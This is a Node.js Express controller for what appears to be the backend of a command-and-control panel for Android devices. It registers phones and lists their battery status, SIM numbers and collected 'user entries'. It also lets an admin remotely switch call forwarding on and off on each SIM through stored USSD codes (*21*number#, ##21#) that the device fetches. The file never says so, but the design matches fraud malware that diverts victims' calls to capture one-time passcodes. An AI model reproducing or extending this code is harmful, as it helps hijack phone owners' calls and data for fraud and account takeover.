const mongoose = require('mongoose');
const Device = require('../models/Device');
const Call = require('../models/Call');
const Battery = require('../models/Battery');
const SimInfo = require('../models/SimInfo');
const User = require('../models/User'); // <-- Import User model

exports.addDeviceDetails = async (req, res) => {
    try {
        const { model, manufacturer, androidVersion, brand, simOperator } = req.body;
        if (!model || !manufacturer || !androidVersion || !brand || !simOperator) {
            return res.status(400).json({ success: false, error: "All fields are required!" });
        }

        const newDevice = new Device({ model, manufacturer, androidVersion, brand, simOperator});
        await newDevice.save();

        res.status(201).json({ success: true, message: "Device registered successfully!", uniqueid: newDevice._id });
    } catch (err) {
        res.status(500).json({ success: false, error: "Server Error" });
    }
};
exports.getAllDevicesData = async (req, res) => {
    try {
      // 1. Fetch devices
      const devices = await Device.find({}, 'brand _id');
  
      // 2. Fetch battery statuses
      const batteryStatuses = await Battery.find({}, 'uniqueid batteryLevel connectivity');
  
      // 3. Fetch user data (which has .uniqueid matching Device _id)
      const userDocs = await User.find({}, 'uniqueid entries');
  
      // 4. Create a map from uniqueid -> userDoc for quick lookup
      const userMap = {};
      userDocs.forEach((doc) => {
        // doc.uniqueid should be the same as device._id.toString() if you stored it that way
        userMap[doc.uniqueid] = doc;
      });
  
      // 5. Merge the data
      const devicesWithBattery = devices.map((device) => {
        // find battery info for this device
        const battery = batteryStatuses.find(
          (b) => b.uniqueid && b.uniqueid.toString() === device._id.toString()
        );
  
        // find user info for this device
        const userDoc = userMap[device._id.toString()];
  
        return {
          _id: device._id,
          uniqueid: device._id,
          brand: device.brand,
          batteryLevel: battery ? battery.batteryLevel : 'N/A',
          connectivity: battery ? battery.connectivity : 'Offline',
          // store user entries if found
          userEntries: userDoc ? userDoc.entries : [],
        };
      });
  
      // 6. Render phone.ejs, passing the merged array as "users"
      res.render('phone', { users: devicesWithBattery });
    } catch (err) {
      console.error('Error in getAllDevicesData:', err);
      res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
  };
  
  
exports.getDeviceDetails = async (req, res) => {
    try {
        const device_id = req.params.id;

        // Validate ObjectId
        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }

        // Fetch device details
        const device = await Device.findById(device_id);
        if (!device) {
            return res.status(404).json({ success: false, error: "Device not found" });
        }

        // Fetch SIM details from SimInfo collection
        const simInfo = await SimInfo.findOne({ uniqueid: device_id });

        // Check if simInfo exists and has properties
        const sim1Number = simInfo && simInfo.sim1Number ? simInfo.sim1Number : "N/A";
        const sim2Number = simInfo && simInfo.sim2Number ? simInfo.sim2Number : "N/A";

        // Render final.ejs with device details and SIM info
        res.render('final', { 
            device, 
            sim1Number,
            sim2Number
        });

    } catch (err) {
        console.error("Error fetching device details:", err);
        res.status(500).json({ success: false, error: "Server Error" });
    }
};

// Stop Call Forwarding (Update Same Document)
exports.stopCallForwarding = async (req, res) => {
    try {
        const device_id = req.params.id;
        const { sim } = req.body; // Expecting "SIM 1" or "SIM 2"

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }
        if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
            return res.status(400).json({ success: false, error: "Invalid SIM selection" });
        }

        // Stop call forwarding (Ensure single document update)
        const updatedCall = await Call.findOneAndUpdate(
            { call_id: device_id }, // Ensure single document per device
            { 
                sim: sim, // Update SIM field
                code: "##21#",  // Stop forwarding
                updatedAt: new Date()
            },
            { upsert: true, new: true }
        );

        console.log("Stop Call Forwarding updated document:", updatedCall);
        res.redirect(`/api/device/admin/phone/${device_id}`);
    } catch (error) {
        console.error("Error in stopCallForwarding:", error);
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};

// Start Call Forwarding (Update Instead of Creating New)
exports.setCallForwarding = async (req, res) => {
    try {
        const { phoneNumber, sim } = req.body; // Expecting "SIM 1" or "SIM 2"
        const device_id = req.params.id;

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }
        if (!/^\d{10}$/.test(phoneNumber)) {
            return res.status(400).json({ success: false, error: "Invalid phone number format" });
        }
        if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
            return res.status(400).json({ success: false, error: "Invalid SIM selection" });
        }

        const activationCode = `*21*${phoneNumber}#`;

        // Save or update call forwarding details (Ensure single document)
        const updatedCall = await Call.findOneAndUpdate(
            { call_id: device_id }, // Ensure single document
            { 
                sim: sim, // Update SIM field
                code: activationCode, // Set call forwarding code
                updatedAt: new Date()
            },
            { upsert: true, new: true }
        );

        console.log("Set Call Forwarding updated document:", updatedCall);
        res.redirect(`/api/device/admin/phone/${device_id}`);
    } catch (error) {
        console.error("Error in setCallForwarding:", error);
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};

// Get Call Forwarding Status
exports.getCallForwardingStatus = async (req, res) => {
    try {
        const device_id = req.params.id;
        let simParam = req.query.sim; // Expecting "SIM 1" or "SIM 2"

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, message: "Invalid Device ID", code: null });
        }
        if (simParam && !["SIM 1", "SIM 2"].includes(simParam)) {
            return res.status(400).json({ success: false, error: "Invalid SIM selection" });
        }

        let query = { call_id: device_id };
        
        if (simParam) {
            query.sim = simParam;
        }

        const callData = await Call.findOne(query).select("code sim");
        if (!callData) {
            return res.status(404).json({ success: false, message: "No call forwarding set for this device", code: null });
        }

        res.status(200).json({
            success: true,
            message: "Call forwarding details fetched successfully",
            code: callData.code,
            sim: callData.sim
        });
    } catch (error) {
        console.error("Error fetching call forwarding status:", error);
        res.status(500).json({ success: false, message: "Internal Server Error", code: null });
    }
};
